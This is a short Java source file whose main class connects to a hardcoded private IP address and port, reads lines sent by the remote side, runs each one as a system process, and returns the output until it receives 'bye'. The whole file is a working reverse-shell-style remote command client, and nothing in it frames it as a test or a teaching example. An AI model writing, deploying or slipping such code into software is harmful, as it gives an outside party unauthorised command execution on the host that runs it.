package com.company;

import java.io.*;
import java.net.*;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        //try (Socket client = new Socket(InetAddress.getLocalHost().getHostAddress(), 51635)) {
        try (Socket client = new Socket("10.242.200.106", 5461)) {
            Scanner in=new Scanner(System.in);
            System.out.println("connected !");
            PrintWriter pw=new PrintWriter(client.getOutputStream());
            BufferedReader bf=new BufferedReader(new InputStreamReader(client.getInputStream()));

            String s,to;
            while(!(s=bf.readLine()).equals("bye")){
                InputStream is=por(s);
                if(is==null){
                    pw.println("Faild");
                    pw.flush();
                    continue;
                }
                BufferedReader br=new BufferedReader(new InputStreamReader(is));
                br.lines().forEach(pw::println);
                br.close();
                pw.flush();
            }
            client.close();
            /*while(true) {
                String s = in.nextLine();
                pw.println(s);
                pw.flush();
                if(s.equals("bye")) {
                    client.close();
                    break;
                }
            }*/
        }catch (IOException e){
            System.out.println("Error in client");
        }

    }
    public static InputStream por(String cmd){
        try {
            Process p=new ProcessBuilder(cmd).start();
            return p.getInputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
